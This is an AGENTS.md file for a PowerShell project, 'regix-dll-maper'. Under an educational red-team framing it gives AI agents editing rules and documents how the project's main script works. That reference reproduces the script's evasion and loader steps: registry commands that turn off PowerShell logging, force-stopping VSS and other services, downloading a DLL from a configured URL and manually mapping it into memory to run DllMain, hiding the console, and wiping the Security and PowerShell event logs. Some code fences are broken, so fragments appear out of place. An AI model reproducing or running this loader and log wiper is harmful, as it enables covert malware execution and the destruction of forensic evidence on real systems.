# AGENTS.md — AI Coding Agent Guide

This file tells **all AI coding models** how to help update, maintain, and document the `regix-dll-maper` project. It is the single source of truth for agent behavior in this repository.

> 🎓 **Educational & Authorized Testing Purposes Only** — This project is an offensive-security style toolkit for authorized red-team research, security education, and defensive detection engineering. All AI contributions must preserve and reinforce this framing.

---

## 🛡️ AI Update Rules & Guardrails (Strict Governance)

### What AI models CAN change

- `README.md` — human-facing documentation
- `AGENTS.md` — this file (agent-facing documentation)
- `docs/DETECTION.md` — defensive detection content
- `docs/DISCLAIMER.md` — legal / authorization / RoE content
- `config.ps1.example` — configuration template
- `CHANGELOG.md` — version history

### What AI models MUST NOT change

- `main.ps1` — **NEVER modify.** It remains exactly as-is. It is the audited core script.
- Remove or weaken any `AUTHORIZED USE ONLY`, `[!DANGER]`, `[!WARNING]`, or educational disclaimer.
- Add malicious payloads, exploit code, or instructions for unauthorized use.
- Change the license to remove liability protections.

### Pre-edit Checklist (required for every AI change)

Before making any edit, the AI model must answer **YES** to all:

| #   | Check                                                                | Pass? |
| --- | -------------------------------------------------------------------- | ----- |
| 1   | The change is to a documentation file, not `main.ps1`                | ☐     |
| 2   | All authorization warnings and educational disclaimers are preserved | ☐     |
| 3   | The change does not weaken any safety guardrail                      | ☐     |
| 4   | The change reinforces the educational / authorized-testing purpose   | ☐     |
| 5   | `CHANGELOG.md` will be updated with the change                       | ☐     |
| 6   | The change has been reviewed for educational-purpose alignment       | ☐     |

### Versioning & Changelog

- Every meaningful doc change gets an entry in `CHANGELOG.md`.
- Use semantic versioning (e.g., `v1.0.0`, `v1.0.1`).
- Format: `### [vX.Y.Z] - YYYY-MM-DD` followed by bullet entries.

---

## 📁 File Map

| File                 | Role                                                                                               | Editable by AI?       |
| -------------------- | -------------------------------------------------------------------------------------------------- | --------------------- |
| `README.md`          | Human-facing docs: visual dashboard, Mermaid/ASCII diagrams, configuring guide, usage, disclaimers | ✅ Yes                |
| `AGENTS.md`          | AI-facing guide: rules, technical reference, contribution checklist                                | ✅ Yes                |
| `main.ps1`           | Core PowerShell script (hidden console, logging bypass, log wiper, manual DLL mapper)              | ❌ **NO**             |
| `config.ps1.example` | Template for `$dllUrl` and user settings                                                           | ✅ Yes                |
| `docs/DETECTION.md`  | Sigma rules, EventLog queries, YARA, EDR hunting, blue-team IR playbook                            | ✅ Yes                |
| `docs/DISCLAIMER.md` | Full legal: authorization, jurisdiction, RoE, pre-run checklist                                    | ✅ Yes                |
| `CHANGELOG.md`       | Version history                                                                                    | ✅ Yes                |
| `LICENSE`            | MIT License                                                                                        | ❌ No (do not modify) |

---

## 🔧 Technical Reference: How `main.ps1` Works

> 📖 This section is a **read-only reference** for AI models to understand the code. It does **not** authorize modifications to `main.ps1`.

### High-Level Execution Flow

```
Start → Admin Gate → Stop Services → Disable Logging → Clean Temp → Hide Console
  → Dot-source config.ps1 ($dllUrl) → Download DLL → Parse PE → Alloc RWX Memory
  → Map Sections → Relocate → Resolve Imports → Protect Sections → Flush Cache
  → Call DllMain → Wipe Event Logs → Final Cleanup → Exit
```

### Component Breakdown

#### 1. Service Disruption

```powershell
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WSearch" -Name "Start" -Value 4
Stop-Service -Name "WSearch" -Force
Stop-Service -Name "cbdhsvc*" -Force
Stop-Service -Name "VSS*" -Force
Stop-Service -Name "fhsvc*" -Force
```

- Sets Windows Search (`WSearch`) startup to `4` (disabled).
- Force-stops `cbdhsvc*`, `VSS*`, `fhsvc*` services (error-silently).

#### 2. Logging Suppression

```powershell
reg add 'HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging' /v EnableModuleLogging /t REG_DWORD /d 0 /f
reg add 'HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging' /v EnableScriptBlockLogging /t REG_DWORD /d 0 /f
# Same for WOW6432Node (32-bit) hive
```

- Disables PowerShell ModuleLogging and ScriptBlockLogging in both 64-bit and 32-bit registry hives.

#### 3. Temp Cleanup

Removes files from `$env:TEMP` created within the last 2 minutes: `*.cs`, `*.dll`, `*.pdb`, `*.tmp`, `*.ps1`.

#### 4. Strict Mode & Preference Silencing

```powershell
Set-StrictMode -Version Latest
$VerbosePreference = 'SilentlyContinue'
$DebugPreference = 'SilentlyContinue'
$ErrorActionPreference = 'SilentlyContinue'
$ConfirmPreference = 'None'
$MaximumHistoryCount = 0
```

- Suppresses all output, errors, confirmations, and history.

#### 5. Admin Gate + Hidden Console

````powershell
if (!([bool]([Security.Principal.WindowsPrincipal] ...).IsInRole("Administrator"))) { return }

#### 6. LogWiper C# Class
Added via `Add-Type`. Stops the EventLog service, then:
- Deletes `.evtx` files for System, Windows PowerShell, Microsoft-Windows-PowerShell/Operational, Security.
- Falls back to rename + delete, then `MoveFileEx(..., MOVEFILE_DELAY_UNTIL_REBOOT)`, then truncation.
- Restarts the EventLog service if it was running.
- Verifies logs are empty by reading up to 5 records.

#### 7. NativeLoader C# Class (Manual DLL Mapper)
Added via `Add-Type`. The core mapping logic:
1. **Validate** — checks MZ signature (`0x5A4D`) and PE signature (`0x4550`).
2. **Architecture check** — compares DLL bitness with host `IntPtr.Size`; throws on mismatch.
3. **Allocate** — `VirtualAlloc` with `MEM_COMMIT \| MEM_RESERVE`, `PAGE_READWRITE`.
4. **Copy** — copies DOS header + PE headers, then each section's raw data to its virtual address.
5. **Relocate** — processes the base relocation table, applying `delta = actualBase - preferredBase` (IMAGE_REL_BASED_DIR64 type 10, IMAGE_REL_BASED_HIGHLOW type 3).
6. **Resolve Imports** — walks the import directory, loads dependency DLLs via `LoadLibraryA`, resolves function addresses via `GetProcAddress`, writes them into the import address table.
7. **Protect** — `VirtualProtect` each section to its original characteristics (RX, RW, etc.).
8. **Flush** — `FlushInstructionCache`.
9. **Entry Point** — if `callEntry = $true`, calls `CRT_INIT` then `DllMain(h, 1, NULL)`.

#### 8. DLL Download & Mapping
```powershell
$bytes = (New-Object System.Net.WebClient).DownloadData($dllUrl)
[NativeLoader]::Map($bytes, $true)
````

- Downloads the DLL from `$dllUrl` (configured in `config.ps1`).
- Maps with `callEntry = $true`.

#### 9. Final Wipe + Cleanup

- Calls `[LogWiper]::Wipe()` again.
- Removes temp artifacts.
- Clears `$bytes`, `$loaderCode`, `$logWiperCode`.
- Forces GC (`[GC]::Collect()` twice).
- Clears PowerShell console host history.
- Calls `Invoke-Finalize` (wipes script variables, clears host, GC).
  [Console.Window]::ShowWindow([Console.Window]::GetConsoleWindow(), 0)

```
- Exits if not running as Administrator.
- Hides the console window via `ShowWindow(hWnd, 0)` = `SW_HIDE`.

---

## ⚙️ Configurable Elements

| Element | Location | How to Configure |
|---------|----------|------------------|
| `$dllUrl` | `config.ps1` | Set to the HTTPS URL of the DLL to download |
| `callEntry` | `main.ps1` (hardcoded `$true`) | Not user-configurable without editing `main.ps1` |
| Temp cleanup window | `main.ps1` (hardcoded 2 minutes) | Not user-configurable without editing `main.ps1` |

> The canonical configuration pattern is: copy `config.ps1.example` → `config.ps1`, edit `$dllUrl`, then dot-source `. ./config.ps1` before running `.\main.ps1`.

---

## ✅ AI Contribution Checklist

Complete this before submitting any change:

- [ ] File edited is NOT `main.ps1`
- [ ] All `AUTHORIZED USE ONLY` banners preserved
- [ ] All `[!DANGER]` / `[!WARNING]` / `[!NOTE]` callouts preserved
- [ ] Educational-purpose framing maintained
- [ ] No malicious examples or payloads added
- [ ] `CHANGELOG.md` updated with version + date + description
- [ ] Change reviewed against "does this weaken safety guardrails?" — answer: NO
- [ ] Markdown syntax valid (rendered preview checked)

---

## 🚫 Prohibited AI Actions

- ❌ Do not edit `main.ps1` under any circumstances.
- ❌ Do not remove, weaken, or obscure authorization warnings.
- ❌ Do not add working exploit code, malware samples, or C2 instructions.
- ❌ Do not provide instructions for running on systems without written authorization.
- ❌ Do not claim the tool is undetectable or "safe" for unauthorized use.

---

## 📚 Related Documentation

- [`README.md`](./README.md) — Human-facing visual docs, dashboard, diagrams, configuring guide
- [`docs/DETECTION.md`](./docs/DETECTION.md) — Defensive detection (Sigma, EventLog, YARA, blue-team IR)
- [`docs/DISCLAIMER.md`](./docs/DISCLAIMER.md) — Full legal, authorization, RoE, pre-run checklist
- [`config.ps1.example`](./config.ps1.example`)` — Configuration template
- [`CHANGELOG.md`](./CHANGELOG.md`)` — Version history
- [`LICENSE`](./LICENSE`)` — MIT License

---

**Remember:** This project exists for **educational and authorized security-testing purposes**. All AI assistance must uphold that mission.
```
